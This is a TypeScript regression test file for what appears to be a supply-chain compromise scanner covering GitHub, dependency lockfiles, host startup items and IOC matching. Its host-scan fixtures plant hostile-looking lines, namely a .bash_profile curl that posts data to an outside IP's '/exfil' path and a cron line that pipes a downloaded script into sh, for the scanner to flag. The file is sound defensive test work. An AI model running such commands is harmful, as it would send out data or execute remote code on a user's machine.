// One regression test per defect a code review found (and reproduced) in v1.3.1.
import { mkdirSync, utimesSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { main } from "../src/cli.js";
import { intel } from "../src/intel.js";
import { matchers, packageHit } from "../src/ioc.js";
import { Run } from "../src/run.js";
import { antivirusPass } from "../src/scan/antivirus.js";
import { scanDeps } from "../src/scan/deps.js";
import { scanGithub } from "../src/scan/github.js";
import { scanHost } from "../src/scan/host.js";
import { riskSignals } from "../src/scan/hostintel.js";
import { parseLockfile } from "../src/scan/lockfiles.js";
import { walk } from "../src/scan/walk.js";
import type { IocFile } from "../src/types.js";
import { AIKIDO_IOCS, aikidoRun, fakeGh, tmp } from "./helpers.js";

const NOW = new Date("2026-11-12T12:00:00Z");
const none = async () => ({ ok: false, status: 1, stdout: "", stderr: "", missing: true });
const C0 = AIKIDO_IOCS.campaigns[0] as IocFile["campaigns"][0];
const withIndicators = (indicators: IocFile["campaigns"][0]["indicators"]): IocFile => ({ campaigns: [{ ...C0, indicators }] });

function put(root: string, rel: string, body: string, mtime?: Date) {
  const p = join(root, rel);
  mkdirSync(join(p, ".."), { recursive: true });
  writeFileSync(p, body);
  if (mtime) utimesSync(p, mtime, mtime);
  return p;
}

describe("review #1: a refused IOC file is never swept", () => {
  it("scans re-validate iocs.json", async () => {
    const run = aikidoRun();
    run.write("iocs.json", { campaigns: [{ ...C0, sources: ["S9"], indicators: [{ type: "branch", value: "x", source: "S9" }] }] });
    expect(await main(["scan", "deps", "--out", run.dir, "--roots", tmp(), "--no-osv"])).toBe(2);
  });
});

describe("review #2: GitHub failures are gaps, never clean", () => {
  it("a 403 on a repository's reads and a 500 on events become gaps", async () => {
    const base = fakeGh({
      user: { login: "me" },
      "search/issues": { items: [] },
      "search/commits": { items: [] },
      "user/keys": [],
      "user/gpg_keys": [],
      rate_limit: { resources: { core: { remaining: 5000 } } },
      "user/repos": [{ full_name: "o/r", archived: false, pushed_at: "2026-11-12T00:00:00Z", default_branch: "main", permissions: { push: true } }],
    });
    const runner = (async (cmd: string, args: string[]) => {
      const p = args[args.length - 1] as string;
      if (p.startsWith("users/me/events")) return { ok: false, status: 1, stdout: "", stderr: "gh: Server Error (HTTP 500)" };
      if (p.startsWith("repos/o/r/")) return { ok: false, status: 1, stdout: "", stderr: "gh: Resource not accessible by integration (HTTP 403)" };
      return base(cmd, args);
    }) as typeof base;
    const r = await scanGithub(AIKIDO_IOCS, runner, { now: NOW });
    expect(r.account.gaps.some((g) => g.what.includes("HTTP 500"))).toBe(true);
    expect(r.repos.gaps.some((g) => g.what.includes("HTTP 403"))).toBe(true);
  });
});

describe("review #6: a backdated commit is still in the window", () => {
  it("uses the committer date", async () => {
    const gh = fakeGh({
      user: { login: "me" },
      "search/issues": { items: [] },
      "search/commits": { items: [] },
      "users/me/events": [],
      "user/keys": [],
      "user/gpg_keys": [],
      rate_limit: { resources: { core: { remaining: 5000 } } },
      "user/repos": [{ full_name: "o/r", archived: false, pushed_at: "2026-11-12T00:00:00Z", default_branch: "main", permissions: { push: true } }],
      "repos/o/r/pulls": [],
      "repos/o/r/branches": [],
      "repos/o/r/commits": [
        {
          sha: "abc",
          commit: { message: "chore: add ci helper", author: { date: "2024-01-01T00:00:00Z" }, committer: { date: "2026-11-11T10:00:00Z" } },
          author: { login: "x" },
          html_url: "u",
        },
      ],
      "repos/o/r/commits/abc": { files: [{ filename: ".ci-a.sh", status: "added" }] },
      "repos/o/r/actions/runs": { workflow_runs: [] },
    });
    const r = await scanGithub(AIKIDO_IOCS, gh, { now: NOW });
    expect(r.repos.findings.some((f) => f.title.startsWith("Commit abc"))).toBe(true);
  });
});

describe("review #8: host false negatives", () => {
  it("platform-build extensions, dotted repo names, .bash_profile IOCs, cron.d lines, skipped folders", async () => {
    const home = tmp("ug-rev8-");
    put(home, ".vscode/extensions/evil.ext-1.2.3-darwin-arm64/package.json", "{}");
    put(home, "code/next.js/.git/config", '[remote "origin"]\n\turl = https://github.com/acme/next.js.git\n');
    put(home, ".bash_profile", "export X=1\ncurl -d @x http://194.150.166.244:8080/exfil\n");
    put(home, "crond/evil", "* * * * * root curl -s http://x/i | sh\n", new Date("2025-01-01"));
    put(home, "code/app/node_modules/.ci-x.sh", "x");
    const iocs = withIndicators([...C0.indicators, { type: "package", ecosystem: "vscode", value: "evil.ext", versions: ["1.2.3"], source: "S1" }]);
    const r = await scanHost(iocs, walk([join(home, "code")]), none, {
      home,
      startupDirs: [join(home, "crond")],
      hitRepos: ["acme/next.js"],
      skipLive: true,
      now: NOW,
    });
    const t = r.findings.map((f) => `${f.severity}: ${f.title}`);
    expect(t.some((x) => x.startsWith("compromised: Editor extension evil.ext@1.2.3"))).toBe(true);
    expect(t.some((x) => x.startsWith("exposed: Local clone of acme/next.js"))).toBe(true);
    expect(t.some((x) => x.startsWith("compromised:") && x.includes(".bash_profile"))).toBe(true);
    expect(t.some((x) => x.includes("evil") && x.includes("downloads and runs a script"))).toBe(true);
    expect(r.gaps.some((g) => g.what.includes("node_modules (1)"))).toBe(true);
  });
});

describe("review #9: deps", () => {
  it("normalises PyPI names and reads pnpm v5, gems with a platform, go.sum without /go.mod-only lines", () => {
    const ind = { type: "package" as const, ecosystem: "pypi", value: "python_dateutil", versions: ["2.8.2"], source: "S1" };
    expect(packageHit(ind, "pypi", "python-dateutil", "2.8.2")).toBe(true);
    expect(parseLockfile("pnpm-lock.yaml", "packages:\n\n  /react-dom/17.0.2_react@17.0.2:\n    x: y\n")).toEqual([
      { ecosystem: "npm", name: "react-dom", version: "17.0.2" },
    ]);
    expect(parseLockfile("Gemfile.lock", "GEM\n  specs:\n    nokogiri (1.16.0-arm64-darwin)\n")).toEqual([
      { ecosystem: "rubygems", name: "nokogiri", version: "1.16.0" },
    ]);
    expect(parseLockfile("go.sum", "github.com/a/b v1.0.0/go.mod h1:x=\ngithub.com/a/b v1.1.0 h1:y=\ngithub.com/a/b v1.1.0/go.mod h1:z=\n")).toEqual([
      { ecosystem: "go", name: "github.com/a/b", version: "v1.1.0" },
    ]);
  });

  it("a capped walk is a deps gap, not a clean bill", async () => {
    const r = await scanDeps(AIKIDO_IOCS, { files: [], gitDirs: [], vscodeDirs: [], entries: 10, capped: true, unreadable: 0, pruned: {} }, undefined, {
      checker: false,
    });
    expect(r.gaps.some((g) => g.why === "the walk is capped")).toBe(true);
  });
});

describe("review #11: matching edge cases", () => {
  const hit = (type: "ip" | "domain" | "url" | "file", value: string, s: string, regex = false) =>
    matchers(withIndicators([{ type, value, source: "S1", regex }]), type).some((m) => m.test(s));
  it("IPs and domains match on boundaries, defanged forms are re-armed, file regexes match basenames", () => {
    expect(hit("ip", "1.2.3.4", "-> 11.2.3.45:80")).toBe(false);
    expect(hit("ip", "1[.]2[.]3[.]4", "-> 1.2.3.4:80")).toBe(true);
    expect(hit("domain", "evil.com", "https://notevil.com/x")).toBe(false);
    expect(hit("domain", "evil[dot]com", "https://cdn.evil.com/x")).toBe(true);
    expect(hit("url", "hxxps[://]evil.com/p", "curl https://evil.com/p")).toBe(true);
    expect(hit("file", "^setup_bun\\.js$", "/Users/u/p/setup_bun.js", true)).toBe(true);
  });
});

describe("review #12, #13: scanner robustness", () => {
  it("an unfinished ClamAV run is a gap", async () => {
    const runner = async (cmd: string, args: string[]) => {
      if (cmd === "clamdscan") return { ok: false, status: 2, stdout: "", stderr: "" };
      if (args[0] === "--version") return { ok: true, status: 0, stdout: "ClamAV 1.5.4/1/Wed Nov 11 08:00:00 2026\n", stderr: "" };
      return { ok: false, status: 137, stdout: "", stderr: "LibClamAV Warning: x\n" };
    };
    const dir = tmp();
    const r = await antivirusPass(runner, {
      home: dir,
      inventory: { startupItems: [], credentials: [], recentExtensions: [], shellStartup: [] },
      flagged: [],
      sinceMs: 0,
      listDir: dir,
      now: NOW,
      full: ["/a"],
    });
    expect(r.gaps.some((g) => g.why.includes("did not finish (exit 137)"))).toBe(true);
  });

  it("a 2 MB line does not stall the risk patterns", () => {
    const t = Date.now();
    riskSignals(`curl ${">".repeat(2_000_000)}`, undefined, "/h");
    expect(Date.now() - t).toBeLessThan(2000);
  });
});

describe("review #15: sources keep their text file", () => {
  it("intel records the extracted text in sources.json", async () => {
    const run = new Run(tmp());
    await intel(run, [{ url: "https://x.dev/a" }], async (url) => ({ text: "t".repeat(400), title: "T", status: 200, finalUrl: url }));
    expect(run.sources()[0]?.file).toBe("sources/S1.md");
  });
});

describe("gap analysis follow-ups", () => {
  it("check names every compromised subject, not only the surface", async () => {
    const { checkAnswer } = await import("../src/check.js");
    const run = aikidoRun();
    const f = (subject: string, key: string) => ({
      surface: "github:repos" as const,
      severity: "compromised" as const,
      subject,
      title: "PR",
      evidence: { kind: "url" as const, ref: "u" },
      key,
    });
    run.recordSurface({ surface: "github:repos", scanned: true, stats: {}, startedAt: "" }, [f("org/alpha", "a"), f("org/bravo", "b")], []);
    const text = "The repositories are COMPROMISED: org/alpha got the probe [F1].\n\n## Coverage\nnone";
    expect(checkAnswer(run, text).map((p) => p.rule)).toContain("omitted-subject");
    expect(checkAnswer(run, `${text}\nAnd org/bravo too.`).map((p) => p.rule)).not.toContain("omitted-subject");
  });

  it("watch alerts once on a new suspicious item, as REVIEW", async () => {
    const { watchCommit } = await import("../src/watch.js");
    const state = tmp("ug-w-");
    const run = aikidoRun();
    for (const surface of ["github:account", "github:repos", "deps", "cloud"] as const)
      run.recordSurface({ surface, scanned: true, stats: {}, startedAt: "" }, [], []);
    run.recordSurface(
      { surface: "host", scanned: true, stats: {}, startedAt: "" },
      [
        {
          surface: "host",
          severity: "suspicious",
          subject: "/LA/x.plist",
          title: "Risky startup item x.plist",
          evidence: { kind: "file", ref: "/LA/x.plist" },
          key: "x",
        },
      ],
      [],
    );
    const c = await watchCommit(state, run);
    expect(c.summary).toMatch(/^REVIEW: machine analysis → host SUSPICIOUS: Risky startup item/);
    expect(c.exitCode).toBe(10);
    expect((await watchCommit(state, run)).alert).toBe(false);
  });

  it("the activity log finds a deleted attacker branch", async () => {
    const gh = fakeGh({
      user: { login: "me" },
      "search/issues": { items: [] },
      "search/commits": { items: [] },
      "users/me/events": [],
      "user/keys": [],
      "user/gpg_keys": [],
      rate_limit: { resources: { core: { remaining: 5000 } } },
      "user/repos": [{ full_name: "o/r", archived: false, pushed_at: "2026-11-12T00:00:00Z", default_branch: "main", permissions: { push: true } }],
      "repos/o/r/pulls": [],
      "repos/o/r/branches": [{ name: "main" }],
      "repos/o/r/activity": [
        { ref: "refs/heads/wfx-docs", activity_type: "branch_creation", actor: { login: "victim" }, timestamp: "2026-11-11T10:00:00Z" },
        { ref: "refs/heads/main", activity_type: "push", actor: { login: "me" }, timestamp: "2026-11-11T10:00:00Z" },
      ],
      "repos/o/r/commits": [],
      "repos/o/r/actions/runs": { workflow_runs: [] },
    });
    const r = await scanGithub(AIKIDO_IOCS, gh, { now: NOW });
    expect(r.repos.findings.map((f) => f.title)).toContain("Branch wfx-docs: branch creation by victim");
  });
});
